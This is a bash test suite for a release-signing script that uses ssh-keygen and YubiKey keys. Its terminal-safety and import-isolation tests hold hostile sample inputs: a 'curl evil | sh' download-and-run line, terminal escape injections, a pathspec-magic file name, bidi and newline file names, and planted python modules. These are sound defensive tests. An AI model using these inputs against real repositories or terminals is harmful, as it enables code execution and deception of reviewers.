#!/bin/bash
# tools/pilnk-sign.sh — AJ's release signer (signed-releases plan Task 6, spec 5.3).
# Throwaway plain ed25519 keys stand in for the YubiKey (a FIDO key needs the hardware); the
# YubiKey's touch flag is tested with real spike signatures from tests/image/fixtures/sk-spike.
# GitHub is a local repo, pilnk.io is a file:// JSON, syd1 is a folder reached by a fake
# scp that also rebuilds the fake version.php answer. No test reaches the network.
source "$(dirname "$0")/lib.sh"
source "$(dirname "$0")/sigtest-lib.sh"
SIGN="$REPO/tools/pilnk-sign.sh"
REAL_KEYGEN="$(command -v ssh-keygen)"; REAL_ADD="$(command -v ssh-add)"
export REAL_KEYGEN REAL_ADD
SKFIX="$REPO/tests/image/fixtures/sk-spike"; export SKFIX

# throwaway keys for the whole file; an agent runs only to prove pilnk-sign never uses it
KROOT="$(mktemp -d /tmp/pilnk-sign-keys.XXXXXX)"; _ROOTS+=("$KROOT"); export KROOT
for k in yk backup stranger; do "$REAL_KEYGEN" -q -t ed25519 -N '' -C "$k" -f "$KROOT/$k"; done
eval "$(ssh-agent -s)" >/dev/null
trap '_rm_roots; ssh-agent -k >/dev/null 2>&1' EXIT
AGENT_SOCK="$SSH_AUTH_SOCK"

sl() { printf 'release namespaces="pilnk-release" %s %s\n' "$(cut -d' ' -f1,2 "$KROOT/$1.pub")" "$1"; }

# ssh-keygen stand-in. Logs SSH_AUTH_SOCK on -Y sign. `-t ed25519-sk` (the YubiKey) makes a
# plain ed25519 key instead, or fails when $ROOT/.no_yk exists; other -t (the backup key) get a
# test passphrase (none when $ROOT/.nopass exists). $ROOT/.sign_fail: -Y sign fails (no touch).
# $ROOT/.sign_notouch: -Y sign writes the spike's no-touch YubiKey signature. $ROOT/.verify_ok:
# -Y verify says yes (so the touch check is what has to catch it).
keygen_wrapper() {
  fakebin ssh-keygen '
case " $* " in *" -Y sign "*)
  echo "SSH_AUTH_SOCK=${SSH_AUTH_SOCK-}" >> "$CALLS"
  if [ -e "$ROOT/.sign_fail" ]; then exit 1; fi
  if [ -e "$ROOT/.sign_notouch" ]; then cp "$SKFIX/notouch.sig" "${@: -1}.sig"; exit 0; fi ;;
esac
case " $* " in *" -Y verify "*) if [ -e "$ROOT/.verify_ok" ]; then exit 0; fi ;; esac
for a in "$@"; do if [ "$a" = "ed25519-sk" ]; then
  if [ -e "$ROOT/.no_yk" ]; then echo "Key enrollment failed: device not found" >&2; exit 1; fi
  f=""; c=""; while [ $# -gt 0 ]; do case "$1" in -f) f="$2"; shift ;; -C) c="$2"; shift ;; esac; shift; done
  exec "$REAL_KEYGEN" -q -t ed25519 -N "" -C "$c" -f "$f"
fi; done
for a in "$@"; do if [ "$a" = "-t" ]; then
  if [ -e "$ROOT/.nopass" ]; then exec "$REAL_KEYGEN" "$@" -N ""; else exec "$REAL_KEYGEN" "$@" -N "test-pass"; fi
fi; done
exec "$REAL_KEYGEN" "$@"'
}

# scenario [FILE] [PREV_VERSION|null] [PREV_COMMIT|two] [SIGNER yk|stranger|none]: fake GitHub
# with commits one, two (touches FILE, default app.py; $TWO_EXTRA runs first, $TWO_MSG is its
# subject), v1.0.1; pilnk.io's last signed release = PREV at "one", signed by SIGNER (yk).
scenario() {
  mkroot
  export HOME="$ROOT/home"; mkdir -p "$HOME" "$ROOT/syd1"
  export SSH_AUTH_SOCK="$AGENT_SOCK"
  unset XDG_STATE_HOME PILNK_SIGN_RECORD
  local f="${1:-app.py}" prev="${2:-1.0.0}" pcommit="${3:-}" signer="${4:-yk}"
  G init -q -b main "$ROOT/up"
  ( cd "$ROOT/up" && echo 1.0.0 > VERSION && echo 'print(1)' > app.py && echo 'echo hi' > update.sh \
    && { sl yk; sl backup; } > release_signers && G add -A && G commit -qm one )
  ONE="$("$REALGIT" -C "$ROOT/up" rev-parse HEAD)"
  ( cd "$ROOT/up" && eval "${TWO_EXTRA:-}" && mkdir -p "$(dirname "$f")" && echo "# changed" >> "$f" \
    && G add -A && G commit -qm "${TWO_MSG:-two}" )
  TWO="$("$REALGIT" -C "$ROOT/up" rev-parse HEAD)"
  ( cd "$ROOT/up" && echo 1.0.1 > VERSION && G commit -qam v1.0.1 )
  HEADC="$("$REALGIT" -C "$ROOT/up" rev-parse HEAD)"
  statement 1.0.1 "$HEADC" > "$ROOT/expected.txt"
  case "$pcommit" in "") pcommit="$ONE" ;; two) pcommit="$TWO" ;; esac
  statement "$prev" "$pcommit" > "$ROOT/prev.txt"
  if [ "$signer" = none ]; then printf 'x\n' > "$ROOT/prev.txt.sig"
  else "$REAL_KEYGEN" -q -Y sign -f "$KROOT/$signer" -n pilnk-release "$ROOT/prev.txt" >/dev/null 2>&1; fi
  python3 - "$ROOT/version.json" "$prev" "$pcommit" "$ROOT/prev.txt.sig" <<'PY'
import json, sys
out, v, c, sigf = sys.argv[1:5]
rel = None if v == 'null' else {'version': v, 'commit': c,
      'statement': 'pilnk-release 1\nversion %s\ncommit %s\n' % (v, c), 'sig': open(sigf).read()}
json.dump({'version': '1.0.1', 'release': rel}, open(out, 'w'))
PY
  cat > "$ROOT/mkjson.py" <<'PY'
import json, os, re, sys
d, out = sys.argv[1:3]
best = None
for n in os.listdir(d):
    m = re.fullmatch(r'([0-9.]+)\.txt', n)
    if m and os.path.exists(os.path.join(d, m.group(1) + '.sig')):
        best = m.group(1)
st = open(os.path.join(d, best + '.txt')).read()
sig = open(os.path.join(d, best + '.sig')).read()
json.dump({'version': best, 'release': {'version': best, 'commit': st.split()[-1],
           'statement': st, 'sig': sig}}, open(out, 'w'))
PY
  # fake scp: "remote" umask 022 like aj@syd1, then pilnk.io answers with the new pair
  fakebin scp 'a=("$@"); n=${#a[@]}
for ((i=0; i<n-1; i++)); do case "${a[i]}" in -*) ;; *) (umask 022; cp "${a[i]}" "$ROOT/syd1/");; esac; done
[ -e "$ROOT/.scp_noupdate" ] || python3 "$ROOT/mkjson.py" "$ROOT/syd1" "$ROOT/version.json"'
  keygen_wrapper
  export PILNK_SIGN_REPO_URL="$ROOT/up" PILNK_SIGN_CACHE="$ROOT/cache/repo" \
         PILNK_SIGN_VERSION_URL="file://$ROOT/version.json" PILNK_SIGN_KEY="$KROOT/yk" \
         PILNK_SIGN_BACKUP_KEY="$KROOT/backup" PILNK_SIGN_DEST="syd1:/releases/" \
         PILNK_SIGN_SCP="$BIN/scp"
}
ANS=""
run_sign() { OUT="$(printf '%b' "$ANS" | bash "$SIGN" "$@" 2>&1)"; RC=$?; }
uploaded() { [ -n "$(ls -A "$ROOT/syd1")" ]; }

# ---- refusals before anything is shown or signed --------------------------------------------
scenario; ANS='y\n'; run_sign 1.0.1 "$ONE"
ok "refuses a commit that is not origin/main head" '[ "$RC" != 0 ] && [ ! -e "$ROOT/syd1/1.0.1.sig" ]'
scenario; ANS='y\n'; run_sign 1.0.2 "$HEADC"
ok "refuses when VERSION at commit != <version>" '[ "$RC" != 0 ] && ! uploaded'
scenario app.py 1.0.2; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "refuses a version not newer than the last signed one" '[ "$RC" != 0 ] && ! uploaded && grep -q "not newer" <<<"$OUT"'
scenario; run_sign
ok "no arguments -> usage, exit 2" '[ "$RC" = 2 ]'

# ---- the upload address stays off GitHub (pilnk.io sits behind Cloudflare) --------------------
ok "no IPv4 address is written anywhere in pilnk-sign" '! grep -nE "[0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}" "$SIGN"'
scenario; unset PILNK_SIGN_DEST; mkdir -p "$HOME/.config/pilnk-sign"
printf '# where signed releases go\n\nsyd1:/releases/\n' > "$HOME/.config/pilnk-sign/dest"; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "upload address read from ~/.config/pilnk-sign/dest" '[ "$RC" = 0 ] && [ -e "$ROOT/syd1/1.0.1.sig" ] && grep -q "to syd1:/releases/" <<<"$OUT"'
scenario; unset PILNK_SIGN_DEST; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "no upload address -> refuses before anything is shown or signed" '[ "$RC" != 0 ] && ! uploaded && grep -q "pilnk-sign/dest" <<<"$OUT" && ! grep -qw "two" <<<"$OUT" && ! grep -q -- "-Y sign" "$CALLS"'

# ---- what AJ is shown --------------------------------------------------------------------
scenario; ANS='n\n'; run_sign 1.0.1 "$HEADC"
ok "lists commits since the last signed release" 'grep -qw "two" <<<"$OUT" && ! grep -qw "one" <<<"$OUT"'
ok "shows each changed file with +/- counts" 'grep -q "+1 -0 app.py" <<<"$OUT"'
ok "anything but y stops, nothing uploaded" '[ "$RC" != 0 ] && [ -z "$(ls "$ROOT/syd1")" ]'
scenario; ANS='Y\n'; run_sign 1.0.1 "$HEADC"
ok "capital Y also stops" '[ "$RC" != 0 ] && ! uploaded'
scenario update.sh; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "flags root-relevant files and needs a second y" 'grep -q "ROOT-RELEVANT" <<<"$OUT" && [ "$RC" != 0 ] && ! uploaded'
scenario update.sh; ANS='y\ny\n'; run_sign 1.0.1 "$HEADC"
ok "second y accepted -> signs" '[ "$RC" = 0 ] && [ -e "$ROOT/syd1/1.0.1.sig" ]'
scenario update.sh; ANS='n\n'; run_sign 1.0.1 "$HEADC" --diff
ok "--diff shows the flagged files' diff" 'grep -q "^+++ " <<<"$OUT"'
scenario; ANS='n\n'; run_sign 1.0.1 "$HEADC"
ok "no --diff: no diff body for unflagged changes" '! grep -q "^+++ " <<<"$OUT" && ! grep -q ROOT-RELEVANT <<<"$OUT"'
scenario app.py 1.0.0 0123456789abcdef0123456789abcdef01234567; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "last signed commit not in main's history -> warns, needs a second y" 'grep -q "HISTORY CHANGED" <<<"$OUT" && [ "$RC" != 0 ] && ! uploaded'
scenario app.py null; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "no signed release yet -> compares with the previous VERSION bump and signs" '[ "$RC" = 0 ] && grep -q "No signed release" <<<"$OUT" && grep -qw two <<<"$OUT"'

# ---- signing, self-check, upload, confirm ------------------------------------------------
scenario; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "uploads <v>.txt and <v>.sig, confirms version.php" '[ "$RC" = 0 ] && grep -q "done" <<<"$OUT"'
ok "statement is exactly the spec format" 'cmp -s "$ROOT/syd1/1.0.1.txt" "$ROOT/expected.txt"'
ok "uploaded signature verifies on this OpenSSH with the repo's release_signers" \
   '"$REAL_KEYGEN" -Y verify -f "$ROOT/up/release_signers" -I release -n pilnk-release -s "$ROOT/syd1/1.0.1.sig" < "$ROOT/syd1/1.0.1.txt" >/dev/null 2>&1'
ok "YubiKey signing uses the key file itself, no agent" 'grep -qF -- "-Y sign -f $KROOT/yk -n pilnk-release" "$CALLS"'
scenario; ANS='y\n'; OUT="$(printf 'y\n' | (umask 077; bash "$SIGN" 1.0.1 "$HEADC") 2>&1)"; RC=$?
ok "uploaded files are readable by the web server even under umask 077" \
   '[ "$RC" = 0 ] && [ "$(stat -c %a "$ROOT/syd1/1.0.1.txt")" = 644 ] && [ "$(stat -c %a "$ROOT/syd1/1.0.1.sig")" = 644 ]'
scenario; export PILNK_SIGN_KEY="$KROOT/stranger"; ANS='y\ny\n'; run_sign 1.0.1 "$HEADC"
ok "self-verify catches a key not in release_signers" '[ "$RC" != 0 ] && grep -q "does not verify" <<<"$OUT" && ! uploaded'
scenario; export PILNK_SIGN_KEY="$ROOT/nokey"; ANS='y\ny\n'; run_sign 1.0.1 "$HEADC"
ok "YubiKey key file missing -> says to run --init, nothing uploaded" '[ "$RC" != 0 ] && grep -q -- "--init" <<<"$OUT" && ! uploaded'
scenario; touch "$ROOT/.sign_notouch" "$ROOT/.verify_ok"; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "a YubiKey signature without the touch flag is never uploaded" '[ "$RC" != 0 ] && grep -q "no touch flag" <<<"$OUT" && ! uploaded'
scenario; touch "$ROOT/.sign_fail"; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "YubiKey not touched in time -> stops, nothing uploaded" '[ "$RC" != 0 ] && grep -q "not touched" <<<"$OUT" && ! uploaded'
scenario; ANS='y\n'; run_sign 1.0.1 "$HEADC" --backup
ok "--backup signs with the backup key, agent unset" '[ "$RC" = 0 ] && grep -q "SSH_AUTH_SOCK=$" "$CALLS"'
scenario; touch "$ROOT/.scp_noupdate"; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "pilnk.io not showing the release -> not done, non-zero" '[ "$RC" != 0 ] && ! grep -q "done" <<<"$OUT"'

# ---- the record of what AJ signed, and pilnk.io checked against his own keys (review I4) -----
REC() { echo "$HOME/.local/state/pilnk-sign/signed"; }
put_rec() { mkdir -p "$(dirname "$(REC)")"; printf '%s %s\n' "$1" "$2" > "$(REC)"; }
scenario; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "a signed release is added to AJ's local record" '[ "$(tail -n 1 "$(REC)" 2>/dev/null)" = "1.0.1 $HEADC" ]'
scenario app.py 1.0.0 two stranger; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "pilnk.io release not signed by AJ's keys: UNVERIFIED, review not narrowed by it, second y needed" \
   'grep -q UNVERIFIED <<<"$OUT" && grep -qw two <<<"$OUT" && [ "$RC" != 0 ] && ! uploaded'
scenario app.py 1.0.0 two stranger; ANS='y\ny\n'; run_sign 1.0.1 "$HEADC"
ok "... and signs after the second y" '[ "$RC" = 0 ] && [ -e "$ROOT/syd1/1.0.1.sig" ]'
scenario app.py 9.9.9 "" stranger; ANS='y\ny\n'; run_sign 1.0.1 "$HEADC"
ok "an unverified pilnk.io version cannot block signing" '[ "$RC" = 0 ]'
scenario app.py null; put_rec 1.0.0 "$ONE"; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "pilnk.io empty but AJ's record has a release: warns, reviews from the record, second y needed" \
   'grep -q "does not show" <<<"$OUT" && grep -qw two <<<"$OUT" && ! grep -qw one <<<"$OUT" && [ "$RC" != 0 ] && ! uploaded'
scenario; put_rec 1.0.0 "$ONE"; ANS='y\n'; run_sign 1.0.1 "$HEADC"
ok "record matching pilnk.io: one y signs" '[ "$RC" = 0 ] && ! grep -q "does not show" <<<"$OUT"'
scenario app.py null; put_rec 1.0.2 "$ONE"; ANS='y\ny\n'; run_sign 1.0.1 "$HEADC"
ok "a version not newer than AJ's own record is refused" '[ "$RC" != 0 ] && grep -q "not newer" <<<"$OUT" && ! uploaded'

sk_prev() {  # sk_prev touch|notouch: pilnk.io's last release = the spike statement signed by that
  # YubiKey key, and AJ's YubiKey key is that key
  python3 - "$ROOT/version.json" "$SKFIX/statement" "$SKFIX/$1.sig" <<'PY'
import json, sys
out, st, sig = sys.argv[1:4]
json.dump({'version': '1.0.1', 'release': {'version': '0.0.1', 'commit': '0' * 40,
           'statement': open(st).read(), 'sig': open(sig).read()}}, open(out, 'w'))
PY
  mkdir -p "$ROOT/sk"; cp "$SKFIX/$1.pub" "$ROOT/sk/yk.pub"; export PILNK_SIGN_KEY="$ROOT/sk/yk"
}
scenario; sk_prev touch; ANS='n\n'; run_sign 1.0.1 "$HEADC"
ok "pilnk.io release signed by AJ's YubiKey with a touch -> checked" 'grep -q "checked against your keys" <<<"$OUT" && ! grep -q UNVERIFIED <<<"$OUT"'
scenario; sk_prev notouch; ANS='n\n'; run_sign 1.0.1 "$HEADC"
ok "pilnk.io release signed by AJ's YubiKey WITHOUT a touch -> UNVERIFIED" 'grep -q UNVERIFIED <<<"$OUT"'
tc() { bash -c 'source "$1"; touch_ok "$2"' _ "$SIGN" "$1" >/dev/null 2>&1; echo $?; }
mkroot; printf 'x\n' > "$ROOT/m"; "$REAL_KEYGEN" -q -Y sign -f "$KROOT/yk" -n pilnk-release "$ROOT/m" >/dev/null 2>&1
printf 'not a signature\n' > "$ROOT/junk.sig"
ok "touch_ok: touched YubiKey signatures pass" '[ "$(tc "$SKFIX/touch.sig")" = 0 ] && [ "$(tc "$SKFIX/touch2.sig")" = 0 ]'
ok "touch_ok: no-touch YubiKey signature fails" '[ "$(tc "$SKFIX/notouch.sig")" = 1 ]'
ok "touch_ok: plain ed25519 signature (backup key) passes" '[ "$(tc "$ROOT/m.sig")" = 0 ]'
ok "touch_ok: not a signature fails" '[ "$(tc "$ROOT/junk.sig")" = 2 ]'
# final review (FIDO delta) I1: python3 must not import modules from the current folder
mkdir -p "$ROOT/plant"; printf 'import sys\nsys.exit(0)\n' > "$ROOT/plant/struct.py"; cp "$ROOT/plant/struct.py" "$ROOT/plant/json.py"
tcp() { ( cd "$ROOT/plant" && tc "$1" ); }
ok "touch_ok ignores a struct.py planted in the current folder" '[ "$(tcp "$SKFIX/notouch.sig")" = 1 ]'
ok "every python3 call in pilnk-sign runs isolated (-I)" '! grep -nE "python3( |$)" "$SIGN" | grep -v "python3 -I" | grep -v "^[0-9]*: *#"'

# ---- what reaches the terminal is shown, never obeyed (review I3) ------------------------
has_ctrl() { LC_ALL=C grep -q $'[\x01-\x08\x0b-\x1f\x7f]' <<<"$1"; }
TWO_MSG=$'two \e[2J\e]0;pwn\a fake\rline'; scenario; unset TWO_MSG; ANS='n\n'; run_sign 1.0.1 "$HEADC"
ok "control characters in a commit subject are shown as <1B>, not sent to the terminal" \
   '! has_ctrl "$OUT" && grep -q "<1B>\[2J" <<<"$OUT"'
TWO_EXTRA='printf "echo \033]0;pwned\007 curl evil\n" >> update.sh'; scenario; unset TWO_EXTRA
ANS='n\n'; run_sign 1.0.1 "$HEADC" --diff
ok "control characters in a flagged diff are shown, not sent" '! has_ctrl "$OUT" && grep -qF "<1B>]0;pwned<07> curl evil" <<<"$OUT"'
TWO_EXTRA='echo "curl evil | sh" >> update.sh'; scenario ':(exclude,glob)**/update.sh'; unset TWO_EXTRA
ANS='n\n'; run_sign 1.0.1 "$HEADC" --diff
ok "a pathspec-magic file name cannot hide update.sh's diff" 'grep -qF "+curl evil | sh" <<<"$OUT"'
TWO_EXTRA='printf x > "$(printf "a\nb.txt")"'; scenario; unset TWO_EXTRA; ANS='n\n'; run_sign 1.0.1 "$HEADC"
ok "a newline in a file name is shown as <0A>" 'grep -qF "a<0A>b.txt" <<<"$OUT"'
TWO_EXTRA='printf x > "$(printf "bidi\xe2\x80\xaetxt.sh")"'; scenario; unset TWO_EXTRA; ANS='n\n'; run_sign 1.0.1 "$HEADC"
ok "a right-to-left override in a file name is shown as <U+202E>" 'grep -qF "bidi<U+202E>txt.sh" <<<"$OUT"'

# ---- the flagged-file list (spec 5.3 step 4, plus release-check.sh) -----------------------
flag_table() {
  bash -c 'source "$1"; shift; for p in "$@"; do is_root_relevant "$p" && echo "Y $p" || echo "N $p"; done' _ "$SIGN" "$@"
}
FT="$(flag_table update.sh release_signers release_policy bootstrap-selfheal.sh sdr-recover.sh \
  pilnk-dashboard-watchdog.sh pilnkradio-install.sh denoise-install.sh datalink-install.sh install.sh \
  pilnk-hw-setup.sh pilnk.service x/pilnk-ota.timer 99-sdr.rules image/firstboot/run.sh \
  tools/pilnk-sign.sh release-check.sh app.py static/index.html README.md tools/install.sh.md)"
ok "every spec 5.3 step 4 file (and release-check.sh) is flagged" '[ "$(grep -c "^Y " <<<"$FT")" = 17 ]'
ok "ordinary files are not flagged" 'grep -q "^N app.py" <<<"$FT" && grep -q "^N static/index.html" <<<"$FT" && grep -q "^N README.md" <<<"$FT" && grep -q "^N tools/install.sh.md" <<<"$FT"'
# Part B: everything root runs or renders from its signed copy is root-relevant too
PB_FILES="$(grep -v '^#' "$REPO/rootside/MANIFEST" | grep .; (cd "$REPO" && ls rootside/*); echo root_policy; echo rootsync.sh; echo pilnkradio/rtl-sdr-blog.commit)"
# shellcheck disable=SC2086
PB_FT="$(flag_table $PB_FILES)"
ok "sign_flags_manifest_files" '[ -n "$PB_FILES" ] && ! grep -q "^N " <<<"$PB_FT" && [ "$(grep -c "^Y " <<<"$PB_FT")" = "$(wc -l <<<"$PB_FILES")" ]'

# ---- --init: a FIDO key on the YubiKey (Task 1, Ruling S1) ------------------------------
init_scenario() {
  mkroot
  export HOME="$ROOT/home"; mkdir -p "$HOME"
  export SSH_AUTH_SOCK="$AGENT_SOCK"
  unset PILNK_SIGN_KEY PILNK_SIGN_BACKUP_KEY PILNK_SIGN_FIXTURE
  fakebin ssh-add 'exec "$REAL_ADD" "$@"'
  fakebin ykman 'exit 0'
  keygen_wrapper
}
run_init() { OUT="$(bash "$SIGN" --init </dev/null 2>&1)"; RC=$?; }
nothing_kept() { [ -z "$(ls -A "$HOME/.ssh" 2>/dev/null)" ] && [ ! -e "$HOME/pilnk-sign-fixture" ]; }

init_scenario; run_init
ok "--init succeeds" '[ "$RC" = 0 ]'
ok "--init never prints private key material" '! grep -q "PRIVATE KEY" <<<"$OUT"'
ok "--init prints two namespaces-only signer lines" '[ "$(grep -c "^release namespaces=\"pilnk-release\" " <<<"$OUT")" = 2 ]'
ok "--init: YubiKey FIDO key first, then the backup key, then a test signature" '
  [ "$(grep -E "^ssh-keygen (-t ed25519-sk -O application=ssh:pilnk-release |-t ed25519 -a 100 |-q -Y sign -f )" "$CALLS" | cut -d" " -f1-3 | tr "\n" "|")" = "ssh-keygen -t ed25519-sk|ssh-keygen -t ed25519|ssh-keygen -q -Y|" ]'
ok "--init: the YubiKey key file and .pub are in place and are the fixture's first signer" \
   '[ -f "$HOME/.ssh/pilnk_release_yk" ] && [ "$(head -n 1 "$HOME/pilnk-sign-fixture/release_signers" | cut -d" " -f3,4)" = "$(cut -d" " -f1,2 "$HOME/.ssh/pilnk_release_yk.pub")" ]'
ok "--init fixture: exact fixed statement" '[ "$(cat "$HOME/pilnk-sign-fixture/statement")" = "$(printf "pilnk-release 1\nversion 0.0.0\ncommit %s" 0000000000000000000000000000000000000000)" ]'
ok "--init fixture: the YubiKey signature verifies on OpenSSH 8.9" \
   '"$REAL_KEYGEN" -Y verify -f "$HOME/pilnk-sign-fixture/release_signers" -I release -n pilnk-release -s "$HOME/pilnk-sign-fixture/statement.sig" < "$HOME/pilnk-sign-fixture/statement" >/dev/null 2>&1'
ok "--init never uses ssh-agent or ykman" '! grep -q "^ssh-add" "$CALLS" && ! grep -q "^ykman" "$CALLS"'
ok "--init tells AJ to move the backup key offline and delete it" 'grep -q "Bitwarden" <<<"$OUT" && grep -q "delete" <<<"$OUT"'
ok "--init leaves nothing but the four key files beside them" '[ "$(ls -A "$HOME/.ssh" | grep -cv "^pilnk_release_")" = 0 ] && [ "$(ls -A "$HOME/.ssh" | wc -l)" = 4 ]'
run_init
ok "--init refuses to overwrite existing keys" '[ "$RC" != 0 ]'
rm -f "$HOME/.ssh/pilnk_release_backup"; run_init     # AJ did as told: backup private key moved off the laptop
ok "--init after the backup key was moved offline still refuses, no new YubiKey key" \
   '[ "$RC" != 0 ] && grep -q "already exists" <<<"$OUT" && [ "$(grep -c "^ssh-keygen -t ed25519-sk" "$CALLS")" = 1 ]'

init_scenario; touch "$ROOT/.nopass"; run_init
ok "--init refuses a backup key with no passphrase and keeps nothing" '[ "$RC" != 0 ] && grep -q "passphrase" <<<"$OUT" && nothing_kept'
init_scenario; touch "$ROOT/.no_yk"; run_init
ok "--init with no YubiKey stops before the backup key and keeps nothing" \
   '[ "$RC" != 0 ] && grep -q "No YubiKey" <<<"$OUT" && ! grep -q "^ssh-keygen -t ed25519 -a 100" "$CALLS" && nothing_kept'
init_scenario; touch "$ROOT/.sign_fail"; run_init
ok "--init test signature not touched -> keeps nothing" '[ "$RC" != 0 ] && nothing_kept'
init_scenario; touch "$ROOT/.sign_notouch" "$ROOT/.verify_ok"; run_init
ok "--init test signature without the touch flag -> refused, keeps nothing" '[ "$RC" != 0 ] && grep -q "no touch flag" <<<"$OUT" && nothing_kept'
